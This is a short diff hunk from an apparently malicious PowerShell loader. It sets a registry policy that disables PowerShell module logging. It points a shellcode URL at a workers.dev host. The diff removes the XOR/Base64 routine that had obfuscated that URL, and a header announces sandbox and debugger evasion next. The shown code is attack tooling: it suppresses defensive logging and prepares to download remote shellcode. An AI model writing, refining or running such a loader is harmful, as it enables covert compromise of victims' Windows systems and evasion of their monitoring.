@@ -40,19 +40,9 @@ $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Mod
 $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']['EnableModuleLogging'] = 0
 
 # ============================================================
-# 3. OBFUSCATED URL LOADER (XOR key = 7, output stored as Base64)
-#    The raw URL: https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode
-#    XORed with 7, then Base64 encoded.
+# 3. SHELLCODE URL
 # ============================================================
 $shellcodeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode"
-function Invoke-XorDecode {
-    param([byte[]]$EncodedBytes, [int]$Key = 7)
-    $decoded = @()
-    foreach ($b in $EncodedBytes) { $decoded += $b -bxor $Key }
-    return [System.Text.Encoding]::UTF8.GetString($decoded)
-}
-$encBytes = [Convert]::FromBase64String($xorEncodedB64)
-$shellcodeUrl = Invoke-XorDecode -EncodedBytes $encBytes -Key 7
 
 # ============================================================
 # 4. SANDBOX & DEBUGGER EVASION (low resource / no mouse movement / VM detection)
